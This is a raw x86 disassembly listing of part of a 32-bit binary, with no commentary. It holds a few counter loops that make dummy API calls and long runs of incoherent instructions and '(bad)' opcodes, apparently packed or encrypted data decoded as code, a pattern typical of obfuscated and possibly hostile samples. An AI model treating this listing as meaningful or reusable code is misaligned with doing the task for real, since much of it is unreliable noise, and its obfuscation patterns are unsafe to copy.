  401fc7:	xchg   ecx,eax
  401fc8:	ret    
  401fc9:	sub    edx,0xffffffff
  401fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fcd:	xchg   dh,cl
  401fcf:	pop    edi
  401fd0:	mov    bh,0x4f
  401fd2:	aaa    
  401fd3:	test   eax,0x339caeea
  401fd8:	mov    bl,0x95
  401fda:	inc    ecx
  401fdb:	sahf   
  401fdc:	mov    ds:0xe011bc2e,al
  401fe1:	cmp    ebp,esi
  401fe3:	cli    
  401fe4:	dec    esp
  401fe5:	jl     0x401f70
  401fe7:	inc    ebp
  401fe8:	enter  0x15f7,0xcd
  401fec:	mov    ds:0x45c70042,eax
  401ff1:	mov    esp,0xf89cb538
  401ff6:	and    DWORD PTR ds:0x42a3b5,0x0
  402000:	mov    ecx,DWORD PTR ds:0x42a3b5
  402006:	inc    ecx
  402007:	mov    DWORD PTR ds:0x42a3b5,ecx
  40200d:	cmp    DWORD PTR ds:0x42a3b5,0x20
  402014:	jne    0x402025
  40201a:	push   0x13e2
  40201f:	call   DWORD PTR ds:0x4251cc
  402025:	cmp    DWORD PTR ds:0x42a3b5,0x18
  40202c:	jb     0x402000
  402032:	mov    DWORD PTR [ebp-0x54],0xf89f0538
  402039:	and    DWORD PTR ds:0x42a2dd,0x0
  402043:	mov    eax,ds:0x42a2dd
  402048:	inc    eax
  402049:	mov    ds:0x42a2dd,eax
  40204e:	cmp    DWORD PTR ds:0x42a2dd,0x18
  402055:	jne    0x40206b
  40205b:	push   0x2bdc
  402060:	push   0x7e39
  402065:	call   DWORD PTR ds:0x425020
  40206b:	cmp    DWORD PTR ds:0x42a2dd,0x14
  402072:	jb     0x402043
  402078:	sbb    DWORD PTR ds:0x42a331,edi
  40207e:	mov    DWORD PTR [ebp-0x4c],0xf89c85f8
  402085:	jmp    0x402590
  40208a:	int    0xc8
  40208c:	cmp    al,0xcb
  40208e:	rcr    ebx,0xd5
  402091:	(bad)  
  402093:	mov    ch,0x0
  402095:	mov    eax,0x3988be7
  40209a:	inc    esi
  40209b:	or     bh,BYTE PTR [eax+0x78]
  40209e:	push   0x7c
  4020a0:	js     0x40211a
  4020a2:	adc    cl,cl
  4020a4:	dec    ebx
  4020a5:	or     BYTE PTR cs:[ebx-0x6b5863d1],0x82
  4020ad:	and    bh,dl
  4020af:	xchg   DWORD PTR [edi+edi*2],esi
  4020b2:	jb     0x4020bd
  4020b4:	inc    eax
  4020b5:	and    ebx,DWORD PTR [ecx]
  4020b7:	gs in  al,dx
  4020b9:	mov    al,0xa5
  4020bb:	out    0xe6,al
  4020bd:	out    dx,eax
  4020be:	push   eax
  4020bf:	jge    0x4020e3
  4020c1:	xchg   ebx,eax
  4020c2:	adc    eax,0xc9d592c2
  4020c7:	stos   BYTE PTR es:[edi],al
  4020c8:	mov    eax,ds:0xa90cf6b5
  4020cd:	fstp   TBYTE PTR [ebp+0x55]
  4020d0:	push   ebp
  4020d1:	mov    bh,0x45
  4020d3:	push   edx
  4020d4:	les    edx,FWORD PTR [edi-0x63417286]
  4020da:	repnz mov esi,0xe92fca3f
  4020e0:	das    
  4020e1:	or     al,0xb6
  4020e3:	or     BYTE PTR [ecx],0xdb
  4020e6:	and    edx,ebx
  4020e8:	sub    eax,0x908c361c
  4020ed:	dec    edi
  4020ee:	mov    al,0x89
  4020f0:	pop    ds
  4020f1:	loop   0x402097
  4020f3:	stos   DWORD PTR es:[edi],eax
  4020f4:	test   dh,cl
  4020f6:	stc    
  4020f7:	fbstp  TBYTE PTR [edx+0x24a3929d]
  4020fd:	cmp    BYTE PTR [eax],dl
  4020ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402100:	ins    DWORD PTR es:[edi],dx
  402101:	lock dec ebx
  402103:	jns    0x40212b
  402105:	xor    al,0x1f
  402107:	inc    ebx
  402108:	xchg   esi,eax
  402109:	iret   
  40210a:	sbb    cl,BYTE PTR [edx]
  40210c:	push   0x5fd54b2b
  402111:	inc    esi
  402112:	mov    ds:0x42b294aa,al
  402117:	mov    dh,0x87
  402119:	gs add edx,edi
  40211c:	sbb    eax,0x2ec3768e
  402121:	int    0x56
  402123:	mov    dl,0xe
  402125:	fist   WORD PTR [edi+0x28]
  402128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402129:	push   edx
  40212a:	inc    ebx
  40212b:	push   edi
  40212c:	and    eax,0xb16a0c60
  402131:	ins    BYTE PTR es:[edi],dx
  402132:	or     eax,0x5e11461c
  402137:	cmp    DWORD PTR [edx+0x3d],0xffffff9d
  40213b:	jb     0x4021ab
  40213d:	or     dl,BYTE PTR [ecx-0x7c794e20]
  402143:	pop    eax
  402144:	mov    edi,0x140e8a34
  402149:	and    bh,BYTE PTR [ebp-0x3a]
  40214c:	push   esp
  40214d:	ss dec edi
  40214f:	jp     0x40217c
  402151:	div    DWORD PTR [edx-0x306a9b43]
  402157:	mov    eax,0xbea727cf
  40215c:	adc    al,0x22
  40215e:	pop    esi
  40215f:	inc    eax
  402160:	outs   dx,BYTE PTR ds:[esi]
  402161:	mov    esi,0xefb364a2
  402166:	outs   dx,DWORD PTR ds:[esi]
  402167:	jg     0x402173
  402169:	mov    bl,0xb8
  40216b:	mov    ah,0x3f
  40216d:	mov    ecx,0xf62c2b77
  402172:	jg     0x402188
  402174:	hlt    
  402175:	gs iret 
  402177:	iret   
  402178:	adc    ebx,DWORD PTR [esi+ebp*2-0x44e44689]
  40217f:	adc    BYTE PTR [esi+ebx*8],bh
  402182:	ds out dx,al
  402184:	jmp    0x5384:0xa96db1e9
  40218b:	sub    DWORD PTR [esi+0xd568412],ebx
  402191:	mov    dl,0x9a
  402193:	push   ebx
  402194:	stc    
  402195:	pop    ebp
  402196:	sub    ch,BYTE PTR [ebx]
  402198:	pop    ds
  402199:	data16 mov ss,WORD PTR [ebx-0x1c]
  40219d:	pop    ecx
  40219e:	cmp    ebp,DWORD PTR [esi]
  4021a0:	sub    BYTE PTR [ecx-0x12],0xc4
  4021a4:	mov    ecx,0xdf9c65ba
  4021a9:	pop    esp
  4021aa:	test   BYTE PTR [ebp-0x808eaf2],ch
  4021b0:	mov    bh,0x7a
  4021b2:	xchg   ebp,eax
  4021b3:	loope  0x402146
  4021b5:	push   ds
  4021b6:	pop    ds
  4021b7:	pop    ecx
  4021b8:	nop
  4021b9:	cwde   
  4021ba:	ret    
  4021bb:	neg    DWORD PTR [edi-0x68dc614b]
  4021c1:	test   DWORD PTR [esi+0x59b9cdf7],ecx
  4021c7:	jmp    0xda3a3db0
  4021cc:	clc    
  4021cd:	inc    ebx
  4021ce:	jne    0x40223f
  4021d0:	retf   
  4021d1:	or     BYTE PTR [esi+eax*4],al
  4021d4:	add    bh,BYTE PTR [edx-0x29d6c58f]
  4021da:	call   0xb07b64d
  4021df:	daa    
  4021e0:	mov    ecx,0x9bece6a1
  4021e5:	add    eax,0xa28e6120
  4021ea:	mov    ch,0x46
  4021ec:	(bad)  
  4021ed:	jo     0x4021bd
  4021ef:	arpl   WORD PTR [ecx+0x3c20f249],sp
  4021f5:	retf   
  4021f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f7:	popf   
  4021f8:	loopne 0x4021a5
  4021fa:	xor    edx,ebp
  4021fc:	test   BYTE PTR [eax],0x72
  4021ff:	inc    ecx
  402200:	repnz push 0xec4a444b
  402206:	lahf   
  402207:	push   eax
  402208:	(bad)  
  40220a:	mov    dh,0xa8
  40220c:	pop    ds
  40220d:	jb     0x40228b
  40220f:	stc    
  402210:	mov    dh,BYTE PTR [ebx+eax*2+0x74d88ab1]
  402217:	stos   DWORD PTR es:[edi],eax
  402218:	jbe    0x4021ae
  40221a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40221b:	cmp    bl,cl
  40221d:	dec    esp
  40221e:	stos   DWORD PTR es:[edi],eax
  40221f:	push   edi
  402220:	imul   eax,DWORD PTR [ecx+0x4725a7ad],0x55
  402227:	and    ah,ah
  402229:	xchg   ebx,eax
  40222a:	add    eax,0xc34da2ca
  40222f:	and    eax,0x51cdaaf1
  402234:	pushf  
  402235:	jb     0x40226e
  402237:	addr16 mov ds:0x8169,eax
  40223b:	cld    
  40223c:	and    al,0xe2
  40223e:	xchg   edx,eax
  40223f:	and    al,0x6a
  402241:	pop    es
  402242:	inc    ebp
  402243:	sub    eax,DWORD PTR [esi]
  402245:	sub    eax,0xe837f25a
  40224a:	xor    DWORD PTR [ecx+0xc],edx
  40224d:	or     eax,0xf509cfc8
  402252:	cmp    ebx,DWORD PTR [esi-0x15]
  402255:	ror    DWORD PTR [ebx+ebx*8],0x50
  402259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40225a:	je     0x40225e
  40225c:	scas   al,BYTE PTR es:[edi]
  40225d:	jnp    0x4022cc
  40225f:	inc    ecx
  402260:	pop    eax
  402261:	in     eax,0x25
  402263:	cmc    
  402264:	jp     0x40226b
  402266:	icebp  
  402267:	jo     0x402257
  402269:	sub    BYTE PTR [ebp+0x544e12cf],bh
  40226f:	fmul   DWORD PTR [ebx-0x270d068a]
  402275:	cmp    eax,0x243fe92
  40227a:	cdq    
  40227b:	imul   eax,DWORD PTR [edi+0x4e71c7fe],0x8030c524
  402285:	mov    esp,esi
  402287:	mov    al,0xa3
  402289:	fisttp DWORD PTR [edx]
  40228b:	sub    BYTE PTR [ebx-0x737e2050],ah
  402291:	ds mov eax,0x73c7bf3d
  402297:	and    esi,DWORD PTR [esi+0x7888b8be]
  40229d:	pushf  
  40229e:	retf   
  40229f:	lds    esp,FWORD PTR [eax]
  4022a1:	setae  BYTE PTR [edx+0x43]
  4022a5:	dec    esi
  4022a6:	mov    bh,0xfd
  4022a8:	jns    0x402296
  4022aa:	rol    DWORD PTR [esi],1
  4022ac:	push   ebx
  4022ad:	pop    ecx
  4022ae:	call   0x3d8153e2
  4022b3:	push   eax
  4022b4:	outs   dx,DWORD PTR ds:[esi]
  4022b5:	js     0x4022aa
  4022b7:	jp     0x40225b
  4022b9:	xchg   edx,eax
  4022ba:	leave  
  4022bb:	loopne 0x402315
  4022bd:	cmp    edx,DWORD PTR [eax-0x132c484]
  4022c3:	mov    cl,0xee
  4022c5:	dec    ebp
  4022c6:	test   eax,0x78d0d4b2
  4022cb:	imul   edi,esi,0xffffff84
  4022ce:	sub    al,0xf
  4022d0:	scas   eax,DWORD PTR es:[edi]
  4022d1:	push   ecx
  4022d2:	repnz xor ah,al
  4022d5:	and    esp,edx
  4022d7:	je     0x402321
  4022d9:	imul   esp,DWORD PTR [edi],0x10
  4022dc:	std    
  4022dd:	pop    ecx
  4022de:	ret    0xc150
  4022e1:	scas   eax,DWORD PTR es:[edi]
  4022e2:	mov    esi,0x81785e88
  4022e7:	or     eax,0x7239788d
  4022ec:	das    
  4022ed:	ja     0x402318
  4022ef:	pop    eax
  4022f0:	cli    
  4022f1:	pushf  
  4022f2:	outs   dx,BYTE PTR ds:[esi]
  4022f3:	inc    esp
  4022f4:	mov    ds:0xde37a858,al
  4022f9:	and    BYTE PTR [edx-0x3b],bh
  4022fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022fd:	les    eax,FWORD PTR ds:0xf73c8754
  402303:	push   edx
  402304:	mov    DWORD PTR [edi-0x6f],esi
  402307:	and    BYTE PTR [eax+esi*1-0x61],0x46
  40230c:	sbb    DWORD PTR cs:[ecx+edx*4-0x2da29cde],edx
  402314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402315:	std    
  402316:	ret    0x1b8
  402319:	int3   
  40231a:	xlat   BYTE PTR ds:[ebx]
  40231b:	(bad)  
  40231d:	in     eax,dx
  40231e:	outs   dx,BYTE PTR ds:[esi]
  40231f:	pop    edi
  402320:	mov    WORD PTR [ebx-0x66ff359f],?
  402326:	ins    BYTE PTR es:[edi],dx
  402327:	dec    edi
  402328:	mov    ecx,DWORD PTR ds:[ecx+0xc]
  40232c:	fcmovnb st,st(6)
  40232e:	push   ss
  40232f:	mov    bl,0x76
  402331:	clc    
  402332:	(bad)  
  402334:	fwait
  402335:	xchg   esp,eax
  402336:	sbb    BYTE PTR gs:[edi-0x4d416f68],0x7b
  40233e:	jnp    0x402342
  402340:	jecxz  0x40238e
  402342:	jecxz  0x402346
  402344:	dec    ebp
  402345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402346:	mov    ah,0xf1
  402348:	push   es
  402349:	sub    BYTE PTR [eax],0xa9
  40234c:	adc    dl,BYTE PTR [edx-0x29]
  40234f:	mov    ecx,0x2eafe7b9
  402354:	mov    ch,0xb5
  402356:	jb     0x40237d
  402358:	les    ecx,FWORD PTR [eax+0x55]
  40235b:	mov    cl,0xdc
  40235d:	sbb    eax,0x26e6daf2
  402362:	les    edx,FWORD PTR ds:0x6bd95753
  402368:	nop
  402369:	les    ecx,FWORD PTR [eax+0x76]
  40236c:	(bad)  [edi]
  40236e:	je     0x4023d5
  402370:	dec    eax
  402371:	jle    0x4023f2
  402373:	dec    esi
  402374:	jmp    0xef61:0x54cf65fe
  40237b:	or     eax,0x3303c253
  402380:	loopne 0x4023dc
  402382:	mov    al,0x38
  402384:	sub    BYTE PTR [esi],cl
  402386:	aas    
  402387:	mov    cl,0xeb
  402389:	mov    al,ds:0x1eb34f64
  40238e:	mov    ah,0xc9
  402390:	js     0x4023fa
  402392:	mov    ch,0x7
  402394:	in     eax,dx
  402395:	test   DWORD PTR [edx+0x12],0xc2f24b79
  40239c:	jnp    0x4023b8
  40239e:	xor    BYTE PTR [ecx-0x3a4d9dc6],al
  4023a4:	mov    ah,0x4f
  4023a6:	jmp    0x4dd5:0x56d4e44c
  4023ad:	mov    edi,0x5183db6e
  4023b2:	sub    esp,DWORD PTR fs:[edx]
  4023b5:	jb     0x402382
  4023b7:	mov    al,ds:0x66a2bf26
  4023bc:	cmp    BYTE PTR [ecx],ch
  4023be:	or     eax,0x81ff03dc
  4023c3:	inc    edx
  4023c4:	lods   al,BYTE PTR ds:[esi]
  4023c5:	rcl    DWORD PTR [eax],1
  4023c7:	pop    eax
  4023c8:	int3   
  4023c9:	dec    edx
  4023cb:	int3   
  4023cc:	mov    cl,0x6c
  4023ce:	sub    edx,DWORD PTR [ecx+ebp*2]
  4023d1:	pop    ebx
  4023d2:	xlat   BYTE PTR ds:[ebx]
  4023d3:	jae    0x4023e4
  4023d5:	mov    edx,0xd8168cbc
  4023da:	fmul   QWORD PTR [esi-0x31]
  4023dd:	inc    esp
  4023de:	mov    ebx,0xeb7bcfde
  4023e3:	mov    ds:0x231a733b,eax
  4023e8:	fild   WORD PTR [edx+0xcd75bd0]
  4023ee:	cmp    al,0xda
  4023f0:	jecxz  0x4023b8
  4023f2:	jne    0x402459
  4023f4:	or     DWORD PTR [eax],ebx
  4023f6:	frstor [ebp+0x71]
  4023f9:	and    DWORD PTR [ebp+0x38],esi
  4023fc:	enter  0xf481,0xab
  402400:	hlt    
  402401:	and    BYTE PTR [eax],0xc5
  402404:	(bad)  
  402405:	mov    al,0x8c
  402407:	xor    esi,eax
  402409:	xor    eax,0x9c1ef3cb
  40240e:	sub    al,0xc1
  402410:	pop    ecx
  402411:	xlat   BYTE PTR ds:[ebx]
  402412:	aas    
  402413:	out    0x15,eax
  402415:	in     al,dx
  402416:	fist   DWORD PTR [ecx]
  402418:	out    dx,eax
  402419:	outs   dx,BYTE PTR ds:[esi]
  40241a:	xchg   esp,eax
  40241b:	xchg   ecx,eax
  40241c:	mov    ecx,?
  40241e:	cmc    
  40241f:	and    al,0xd6
  402421:	or     BYTE PTR [esi-0x71],dh
  402424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402425:	int3   
  402426:	daa    
  402427:	mov    edx,0x8dc3a3d9
  40242c:	inc    eax
  40242d:	leave  
  40242e:	push   edx
  40242f:	jb     0x40245b
  402431:	xchg   edx,eax
  402432:	fstp   DWORD PTR [edi]
  402434:	xor    esp,eax
  402436:	lds    esi,FWORD PTR [ebx+0x1b9274cf]
  40243c:	fld    TBYTE PTR [ebp-0x50]
  40243f:	add    al,0x7e
  402441:	rcr    BYTE PTR [edx],cl
  402443:	test   al,0xf9
  402445:	ja     0x4023f0
  402447:	mov    al,ds:0x741d060e
  40244c:	popa   
  40244d:	adc    DWORD PTR [ecx+0x2809ecd9],ecx
  402453:	push   cs
  402454:	pusha  
  402455:	cmp    al,0x2f
  402457:	inc    edx
  402458:	jle    0x402480
  40245a:	stc    
  40245b:	adc    ebp,DWORD PTR [edx+0x7f]
  40245e:	inc    ebp
  40245f:	mul    ecx
  402461:	xchg   esp,eax
  402462:	(bad)  
  402463:	fadd   DWORD PTR [ecx]
  402465:	cmp    DWORD PTR [ecx+0x36],ebp
  402468:	int    0xb3
  40246a:	jp     0x402498
  40246c:	push   es
  40246d:	mov    ds:0x2a778144,al
  402472:	retf   
  402473:	popa   
  402474:	xor    al,0x2b
  402476:	sub    DWORD PTR [ebx-0x1ff1119],edi
  40247c:	jp     0x402495
  40247e:	pusha  
  40247f:	stos   DWORD PTR es:[edi],eax
  402480:	push   esp
  402481:	and    dh,cl
  402483:	inc    edi
  402484:	fcomip st,st(0)
  402486:	aas    
  402487:	sub    BYTE PTR ds:0x416b256c,0xa0
  40248e:	mov    cl,0xcf
  402490:	ficom  DWORD PTR [ecx]
  402492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402493:	push   ecx
  402494:	xor    eax,0x9e3b52ae
  402499:	hlt    
  40249a:	mov    al,ds:0xf69748b1
  40249f:	setbe  BYTE PTR [edi+ebp*2]
  4024a3:	es adc eax,0xbf1393b1
  4024a9:	ins    DWORD PTR es:[edi],dx
  4024aa:	jnp    0x402526
  4024ac:	lahf   
  4024ad:	ret    
  4024ae:	mov    ?,WORD PTR [ecx-0x254a0291]
  4024b4:	call   0xb617448b
  4024b9:	pop    es
  4024ba:	xor    DWORD PTR [edi-0x60],edi
  4024bd:	lds    ebp,FWORD PTR [edi+0x64858dfa]
  4024c3:	jp     0x402527
  4024c5:	test   esp,ecx
  4024c7:	inc    ecx
  4024c8:	outs   dx,BYTE PTR ds:[esi]
  4024c9:	test   DWORD PTR [ecx-0x3a],0xbc499462
  4024d0:	(bad)  [edi-0x5e]
  4024d3:	out    0x93,al
  4024d5:	and    BYTE PTR [esi+0x3a],0x7c
  4024d9:	fs rcr BYTE PTR es:[eax+ebx*2],0x88
  4024df:	ins    DWORD PTR es:[edi],dx
  4024e0:	ja     0x402538
  4024e2:	ins    DWORD PTR es:[edi],dx
  4024e3:	(bad)  
  4024e4:	cld    
  4024e5:	imul   ebp,DWORD PTR [edx+0x6c],0x9040746b
  4024ec:	jnp    0x402481
  4024ee:	xor    eax,0x831e034e
  4024f3:	sbb    BYTE PTR [ebx+0x16],0x9c
  4024f7:	adc    dl,cl
  4024f9:	mov    ah,0xef
  4024fb:	push   es
  4024fc:	clc    
  4024fd:	or     al,0x10
  4024ff:	cmp    esi,DWORD PTR [ebx+edi*1]
  402502:	cdq    
  402503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402504:	pop    eax
  402505:	xchg   edi,eax
  402506:	rol    BYTE PTR [edx-0x9],1
  402509:	jge    0x40256d
  40250b:	jno    0x402583
  40250d:	sub    BYTE PTR [ecx+0x27],dh
  402510:	adc    ch,BYTE PTR [edx-0x5aad8f2b]
  402516:	in     eax,dx
  402517:	sub    al,BYTE PTR [ecx+0x21]
  40251a:	mov    al,0x4
  40251c:	adc    bh,BYTE PTR [edx-0x21]
  40251f:	lods   al,BYTE PTR ds:[esi]
  402520:	inc    ebp
  402521:	push   ss
  402522:	push   esp
  402523:	mov    al,ds:0x73371cec
  402528:	or     eax,0x2a1671f0
  40252d:	sbb    ecx,DWORD PTR [esp+ecx*4]
  402530:	mov    edi,0x50529792
  402535:	je     0x402513
  402537:	shl    DWORD PTR [edx-0x42],cl
  40253a:	fimul  DWORD PTR [ebx+eax*4-0x6701c7c5]
  402541:	out    dx,eax
  402542:	ds jecxz 0x4025b3
  402545:	sub    ecx,DWORD PTR [ecx]
  402547:	aas    
  402548:	fdivr  st,st(4)
  40254a:	mov    DWORD PTR [ecx+0x2],esp
  40254d:	out    dx,al
  40254e:	inc    esi
  40254f:	loopne 0x402586
  402551:	cmp    cl,bl
  402553:	mov    gs,WORD PTR [ecx*1-0x16080e51]
  40255a:	fnsave [ecx-0x4043f40a]
  402560:	pop    ebx
  402561:	dec    ebx
  402562:	inc    eax
  402563:	rcr    DWORD PTR [eax],cl
  402565:	jg     0x402585
  402567:	push   cs
  402568:	xchg   ecx,eax
  402569:	push   ss
  40256a:	mov    ds:0xa09bc98b,eax
  40256f:	jl     0x402541
  402571:	xchg   BYTE PTR [esi],bl
  402573:	xchg   ebx,eax
  402574:	shl    edi,0x2c
  402577:	inc    esi
  402578:	rcr    BYTE PTR [eax],1
  40257a:	pop    ds
  40257b:	push   ss
  40257c:	sub    BYTE PTR [ebp+0x72],bl
  40257f:	adc    cl,BYTE PTR [edi+eax*8]
  402582:	repnz fsub st(6),st
  402585:	adc    dl,dl
  402587:	mov    DWORD PTR [edx-0x5e],esi
  40258a:	pop    eax
  40258b:	leave  
  40258c:	push   edx
  40258d:	xchg   esi,eax
  40258e:	ret    0xc724
  402591:	inc    ebp
  402592:	(bad)  
  402593:	fadd   DWORD PTR [ebp+0x458bf89c]
  402599:	lock and ecx,DWORD PTR ds:0x42a33d
  4025a0:	jmp    0x402aab
  4025a5:	leave  
  4025a6:	mov    ebp,0xc93dc93f
  4025ac:	leave  
  4025ad:	jl     0x402558
  4025af:	lods   eax,DWORD PTR ds:[esi]
  4025b0:	aam    0xe4
  4025b2:	(bad)  
  4025b3:	adc    ch,BYTE PTR [edi]
  4025b5:	mov    al,0xd
  4025b7:	js     0x402631
  4025b9:	push   0x7c
  4025bb:	js     0x402635
  4025bd:	addr16 push cs
  4025bf:	xchg   esi,eax
  4025c0:	stos   BYTE PTR es:[edi],al
  4025c1:	mov    al,ah
  4025c3:	mov    dh,0xf9
  4025c5:	out    0x29,al
  4025c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025c8:	hlt    
  4025c9:	sbb    ebx,DWORD PTR [ecx+ebp*2-0x63d4376f]
  4025d0:	push   ecx
  4025d1:	jbe    0x402630
  4025d3:	imul   ebx,edx,0x3fdaf0d4
  4025d9:	retf   
  4025da:	imul   ebx,DWORD PTR [ecx+0x4],0x5d6075f
  4025e1:	out    0x7e,al
  4025e3:	cmc    
  4025e4:	dec    DWORD PTR [edi+eax*2+0x62]
  4025e8:	js     0x4025d5
  4025ea:	arpl   WORD PTR [eax],di
  4025ec:	fisub  WORD PTR [edi-0xc3b6816]
  4025f2:	jmp    0x1dab:0x7d1708d
  4025f9:	push   edi
  4025fa:	jae    0x402670
  4025fc:	sub    eax,0xec9157d0
  402601:	add    esi,ecx
  402603:	push   cs
  402604:	push   0xffffffda
  402606:	test   al,0xa7
  402608:	mov    dl,0xe7
  40260a:	dec    ebx
  40260b:	iret   
  40260c:	push   ecx
  40260d:	call   0x267930d3
  402612:	lds    edi,FWORD PTR [ebx+0x40816c2a]
  402618:	xor    ecx,eax
  40261a:	out    dx,al
  40261b:	jnp    0x4025c2
  40261d:	mov    edx,0x444e8ad0
  402622:	add    ecx,DWORD PTR [edi]
  402624:	(bad)  
  402625:	out    0x42,al
  402627:	lods   al,BYTE PTR ds:[esi]
  402628:	je     0x4026a6
  40262a:	scas   eax,DWORD PTR es:[edi]
  40262b:	js     0x40263b
  40262d:	shl    DWORD PTR [ebx-0x384ab81e],1
  402633:	push   ebx
  402634:	add    ah,BYTE PTR [ebx-0x78]
  402637:	jp     0x402696
  402639:	shr    BYTE PTR [eax+0x2c903593],1
  40263f:	out    0x3,eax
  402641:	stc    
  402642:	rol    edi,0xf0
  402645:	jbe    0x4025c9
  402647:	jmp    0x4fd5:0x7af7d18
  40264e:	cwde   
  40264f:	cwde   
  402650:	idiv   BYTE PTR [eax+0x50a47afe]
  402656:	push   ss
  402657:	inc    esp
  402658:	push   ebx
  402659:	mov    cl,0x29
  40265b:	xor    BYTE PTR [ecx+0x742505d9],ch
  402661:	inc    ecx
  402662:	in     al,0x27
  402664:	cmp    DWORD PTR [eax],ecx
  402666:	dec    ebx
  402667:	sbb    ah,0xd2
  40266a:	adc    BYTE PTR [ebx],ah
  40266c:	addr16 and eax,eax
  40266f:	outs   dx,DWORD PTR ds:[esi]
  402670:	xchg   esp,eax
  402671:	ffreep st(7)
  402673:	nop
  402674:	retf   0x4b28
  402677:	inc    edx
  402678:	mov    ecx,0x703ead79
  40267d:	gs add al,0x26
  402680:	icebp  
  402681:	test   DWORD PTR [ecx],ecx
  402683:	jne    0x40260b
  402685:	dec    esi
  402686:	retf   0x7d0a
  402689:	cli    
  40268a:	ror    BYTE PTR [ecx-0x4d],cl
  40268d:	fsub   QWORD PTR [edx]
  40268f:	dec    ecx
  402690:	jmp    0xfec6:0x5c5b76dc
  402697:	pop    es
  402698:	aad    0x85
  40269a:	inc    ebp
  40269b:	shl    BYTE PTR [edi-0x6d],1
  40269e:	jne    0x4026e8
  4026a0:	daa    
  4026a1:	les    ecx,FWORD PTR [eax]
  4026a3:	and    DWORD PTR [ebx+0x43],ecx
  4026a6:	add    eax,0xea31c9a3
  4026ab:	jno    0x402725
  4026ad:	push   esi
  4026ae:	sbb    DWORD PTR [edx],0x695a796c
  4026b4:	div    edx
  4026b6:	sar    ch,1
  4026b8:	(bad)  
  4026b9:	mov    bl,0x41
  4026bb:	inc    esi
  4026bc:	lods   eax,DWORD PTR ds:[esi]
  4026bd:	add    DWORD PTR [ebx+ecx*8-0x63],0xdd4342b8
  4026c5:	and    al,0x83
  4026c7:	rcr    DWORD PTR [eax],0x49
  4026ca:	pusha  
  4026cb:	fist   WORD PTR [ebx+0x6df73fec]
  4026d1:	test   BYTE PTR [ebx+eax*1-0x23185c49],0x4f
  4026d9:	in     eax,0xf2
  4026db:	icebp  
  4026dc:	test   BYTE PTR [eax],cl
  4026de:	ds pop esp
  4026e0:	pop    ds
  4026e1:	push   0xdcbd6cf1
  4026e6:	push   eax
  4026e7:	test   BYTE PTR [esi],0xea
  4026ea:	into   
  4026eb:	test   BYTE PTR [eax+0x35],dh
  4026ee:	push   ds
  4026ef:	aas    
  4026f0:	loopne 0x40269d
  4026f2:	sub    eax,0xb53b0d3c
  4026f7:	inc    ebp
  4026f8:	mov    esp,0x50d386c
  4026fd:	pop    esi
  4026fe:	push   esi
  4026ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402700:	aaa    
  402701:	fcomp  DWORD PTR [esi+edx*8+0x20]
  402705:	xchg   DWORD PTR [esi],ecx
  402707:	rcr    DWORD PTR [esi],cl
  402709:	sbb    eax,0x294fd2
  40270e:	dec    ecx
  40270f:	jnp    0x402719
  402711:	mov    bh,0x29
  402713:	add    ecx,edx
  402715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402716:	add    eax,0x5f34337a
  40271b:	icebp  
  40271c:	sub    cl,BYTE PTR [edx+0x7]
  40271f:	aad    0xb0
  402721:	scas   al,BYTE PTR es:[edi]
  402722:	xchg   ecx,eax
  402723:	ror    DWORD PTR [edi+0x7e],1
  402726:	sub    ah,BYTE PTR [edx-0x4b]
  402729:	pop    edx
  40272a:	daa    
  40272b:	jmp    0xe0a8:0xc13e103a
  402732:	call   0x64e7d189
  402737:	sbb    al,0x85
  402739:	sti    
  40273a:	out    dx,eax
  40273b:	fist   WORD PTR [ebp+ebx*8+0x2290cddd]
  402742:	test   al,0x74
  402744:	and    eax,0xfe2e1af
  402749:	dec    ebp
  40274a:	imul   eax,DWORD PTR [edi-0x4c4b19ee],0xcca6ae13
  402754:	nop
  402755:	arpl   ax,si
  402757:	jecxz  0x402705
  402759:	stos   BYTE PTR es:[edi],al
  40275a:	fsubp  st(5),st
  40275c:	es jae 0x4027d0
  40275f:	mov    ebx,0x405d477a
  402764:	fsub   QWORD PTR [ebx+0x67fc1f52]
  40276a:	dec    ebx
  40276b:	pop    es
  40276c:	adc    dh,dh
  40276e:	into   
  40276f:	ret    0xa28a
  402772:	setle  BYTE PTR [ecx-0x63def92f]
  402779:	test   al,0xae
  40277b:	sub    DWORD PTR [ebx],ebp
  40277d:	hlt    
  40277e:	ins    DWORD PTR es:[edi],dx
  40277f:	ror    BYTE PTR [esi],cl
  402781:	mov    DWORD PTR [edx+0x4d],0x575ef2c4
  402788:	iret   
  402789:	aas    
  40278a:	fld    TBYTE PTR ds:0xa472accc
  402790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402791:	ja     0x40272e
  402793:	jae    0x402739
  402795:	sbb    ch,cl
  402797:	adc    al,0xc
  402799:	rol    eax,cl
  40279b:	xchg   bh,ah
  40279d:	fidivr WORD PTR [edi+eax*8-0x6d]
  4027a1:	add    BYTE PTR [esi+0x5ef74ae8],0x99
  4027a8:	popa   
  4027a9:	and    ch,ch
  4027ab:	scas   al,BYTE PTR es:[edi]
  4027ac:	or     dl,bh
  4027ae:	cld    
  4027af:	xor    BYTE PTR [edi+0x4c],ch
  4027b2:	ror    BYTE PTR [esi-0x41750b5a],1
  4027b8:	inc    esi
  4027b9:	sbb    DWORD PTR ds:[ebp+0x24],edx
  4027bd:	dec    esi
  4027be:	pop    ebp
  4027bf:	out    dx,eax
  4027c0:	stos   BYTE PTR es:[edi],al
  4027c1:	test   DWORD PTR [ebp-0x32],esp
  4027c4:	mov    ecx,0xc4e7bc6a
  4027c9:	(bad)  
  4027ca:	iret   
  4027cb:	call   0x20d8:0x3822bba3
  4027d2:	adc    ebp,DWORD PTR [esi+0x36f15139]
  4027d8:	cmc    
